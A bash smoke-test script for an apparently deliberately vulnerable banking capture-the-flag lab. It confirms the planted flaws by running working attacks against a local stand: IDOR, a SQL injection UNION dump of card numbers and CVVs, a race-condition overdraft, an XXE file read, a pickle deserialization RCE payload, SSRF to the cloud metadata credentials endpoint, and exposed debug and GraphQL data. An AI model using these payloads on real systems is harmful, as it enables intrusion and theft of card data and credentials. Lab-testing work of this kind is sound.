#!/usr/bin/env bash
# Happy-path smoke test against a running OnlineBank stand.
#   BASE=http://localhost:9080 GW=http://localhost:9500 bash scripts/smoke.sh
# For a host (non-docker) backend set XXE_FILE/RCE_FILE to the local secret dir.
set -uo pipefail
BASE="${BASE:-http://localhost:9080}"
GW="${GW:-http://localhost:9500}"
XXE_FILE="${XXE_FILE:-/app/secret/flag_xxe.txt}"
RCE_FILE="${RCE_FILE:-/app/secret/flag_rce.txt}"
PASS=0; FAIL=0

ok()   { PASS=$((PASS+1)); echo "  ok  - $1"; }
bad()  { FAIL=$((FAIL+1)); echo "  FAIL - $1"; }
need() { command -v "$1" >/dev/null || { echo "missing: $1"; exit 1; }; }
need curl; need jq

echo "== health =="
curl -sf "$BASE/api/v1/core/health" | jq -e '.status=="ok"' >/dev/null && ok "api health" || bad "api health"

echo "== login flow (ama) =="
CH=$(curl -sf -X POST "$BASE/api/v1/auth/login" -H 'Content-Type: application/json' \
     -d '{"login":"ama@onlinebank.app","password":"OnlineBank!123"}' | jq -r .challenge_id)
[ -n "$CH" ] && [ "$CH" != "null" ] && ok "login -> challenge" || bad "login"
PHONE=$(curl -sf "$GW/inbox" | jq -r '.[0].phone')
CODE=$(curl -sf "$GW/inbox/$PHONE" | jq -r '.messages[0].text' | grep -oE '[0-9]{4}' | head -1)
[ -n "$CODE" ] && ok "otp read from gateway ($CODE for $PHONE)" || bad "otp read"
TOKEN=$(curl -sf -X POST "$BASE/api/v1/auth/verify-otp" -H 'Content-Type: application/json' \
        -d "{\"challenge_id\":\"$CH\",\"code\":\"$CODE\"}" | jq -r .token)
[ -n "$TOKEN" ] && [ "$TOKEN" != "null" ] && ok "verify-otp -> token" || bad "verify-otp"
AUTH="Authorization: Bearer $TOKEN"

echo "== accounts =="
ACCTS=$(curl -sf "$BASE/api/v1/accounts" -H "$AUTH")
echo "$ACCTS" | jq -e 'length>=2' >/dev/null && ok "own accounts listed" || bad "own accounts"
ACC1=$(echo "$ACCTS" | jq -r '.[0].id')

echo "== idor (read cto account 1004 as ama) =="
curl -sf "$BASE/api/v1/accounts/1004/transactions" -H "$AUTH" | jq -e '.count>0' >/dev/null \
  && ok "idor statements 1004" || bad "idor statements 1004"

echo "== sqli (union dump) =="
U="') UNION SELECT id, NULL::timestamptz, pan, NULL::float8, cvv, holder, note, 'leak' FROM cards--"
curl -sf -G "$BASE/api/v1/accounts/$ACC1/transactions" --data-urlencode "search=$U" -H "$AUTH" \
  | jq -e '.transactions | map(select((.counterparty // "") | contains("FLAG{"))) | length>0' >/dev/null \
  && ok "sqli union dump" || bad "sqli union dump"

echo "== cards pan =="
curl -sf "$BASE/api/v1/cards" -H "$AUTH" | jq -e '.[0].pan | length==16' >/dev/null \
  && ok "full pan returned" || bad "full pan"

echo "== race (10 parallel conversions of 600 on a 5430 balance) =="
for attempt in 1 2; do
  for i in $(seq 1 10); do
    curl -s -o /dev/null -X POST "$BASE/api/v1/exchange/convert" -H "$AUTH" -H 'Content-Type: application/json' \
      -d "{\"account_id\":$ACC1,\"to_currency\":\"GHS\",\"amount\":\"600\"}" &
  done
  wait
  BAL=$(curl -sf "$BASE/api/v1/accounts/$ACC1/balance" -H "$AUTH" | jq -r .balance)
  python3 -c "import sys; b=float('$BAL'); sys.exit(0 if b < 0 else 1)" && break
done
python3 -c "import sys; b=float('$BAL'); sys.exit(0 if b < 0 else 1)" \
  && ok "overdraft achieved (balance=$BAL)" || bad "race (balance=$BAL)"

echo "== xxe (file read) =="
XXE=$(printf '<?xml version="1.0"?><!DOCTYPE statement [<!ENTITY xxe SYSTEM "file://%s">]><statement><account>1001</account><period>2026-08</period><note>&xxe;</note></statement>' "$XXE_FILE")
curl -sf -X POST "$BASE/api/v1/statements/import" -H "$AUTH" -F "file=@-;filename=statement.xml" <<<"$XXE" \
  | jq -e '.fields.note | contains("FLAG{")' >/dev/null && ok "xxe file read" || bad "xxe"

echo "== pickle rce =="
RCE_PKL=$(mktemp /tmp/ob-pickle.XXXX)
python3 - "$RCE_PKL" <<'EOF'
import pickle, subprocess, sys
class P:
    def __reduce__(self):
        return (subprocess.check_output,
                (["cat", __import__("os").environ.get("RCE_FILE", "/app/secret/flag_rce.txt")],))
with open(sys.argv[1], "wb") as fh:
    fh.write(pickle.dumps(P()))
EOF
curl -sf -X POST "$BASE/api/v1/statements/import" -H "$AUTH" -F "file=@$RCE_PKL;filename=stmt.bnk" \
  | jq -e '.result | contains("FLAG{")' >/dev/null && ok "pickle rce" || bad "pickle rce"
rm -f "$RCE_PKL"

echo "== ssrf (metadata via webhook test) =="
SSRF_URL="${SSRF_URL:-http://169.254.169.254/latest/meta-data/iam/security-credentials/onlinebank-prod-role}"
WH=$(curl -sf -X POST "$BASE/api/v1/webhooks" -H "$AUTH" -H 'Content-Type: application/json' \
     -d "{\"url\":\"$SSRF_URL\"}" | jq -r .id)
curl -sf -X POST "$BASE/api/v1/webhooks/$WH/test" -H "$AUTH" | jq -e '.body_preview | contains("FLAG{")' >/dev/null \
  && ok "ssrf imds credentials" || bad "ssrf imds"

echo "== shadow api =="
curl -sf "$BASE/api/v0/debug/config" | jq -e '.flag | contains("FLAG{")' >/dev/null \
  && ok "v0 debug config" || bad "v0 debug config"

echo "== graphql =="
curl -sf -X POST "$BASE/api/v1/graphql" -H 'Content-Type: application/json' \
  -d '{"query":"{ user(id:5){ login secretNote } }"}' | jq -e '.data.user.secretNote != null' >/dev/null \
  && ok "graphql secret note" || bad "graphql"

echo "== scoreboard =="
curl -sf "$BASE/api/v1/scoreboard/challenges" | jq -e 'length==12' >/dev/null \
  && ok "12 challenges seeded" || bad "challenges"

echo
echo "PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ]
